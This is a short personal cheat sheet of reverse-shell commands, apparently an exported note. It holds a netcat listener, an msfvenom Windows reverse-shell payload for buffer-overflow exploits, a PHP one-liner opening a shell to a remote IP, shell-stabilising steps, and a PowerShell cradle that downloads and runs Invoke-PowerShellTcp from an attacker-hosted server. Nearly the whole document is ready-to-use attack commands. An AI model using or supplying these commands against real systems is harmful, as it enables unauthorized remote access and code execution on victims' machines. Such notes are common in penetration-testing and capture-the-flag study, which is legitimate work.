---
title: REVERSE SHELLS
updated: 2023-11-26 10:58:14Z
created: 2023-10-24 10:19:41Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

# Netcat Listener
`rlwrap nc -nlvp 666`

# Generate Reverse Shell for buffer-overflow payload
1. For access to a windows host or file system
`msfvenom -p windows/shell_reverse_tcp LHOST=<HackerIP> LPORT=666 -f python -b '\x00'`


# Upgrading Shell
If linux shell comes back with no tty escape
`python -c 'import pty; pty.spawn("/bin/bash")'`
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`CTRL-Z` to put process in backgroup
`stty raw -echo`
`fg`
`fg`
`export TERM=xterm`

# PHP Reverse Shell - 1 liner
`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

# TTY Escape
`python3 -c 'import pty; pty.spawn("/bin/sh")'`

(inside the nc session) 
**CTRL+Z**
**stty raw -echo**
**fg**
**ls**
**export SHELL=/bin/bash**
**export TERM=screen**
**stty rows 38 columns 116**
**reset**

# PowerShell reverse shell

```
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <kali> -Port 443' >>
Invoke-PowerShellTcp.ps1
```
`python3 -m http.server 80`

On target:
```
powershell -c iex(new-object net.webclient).downloadstring('http://<kali>/Invoke-PowerShellTcp.ps1’)
```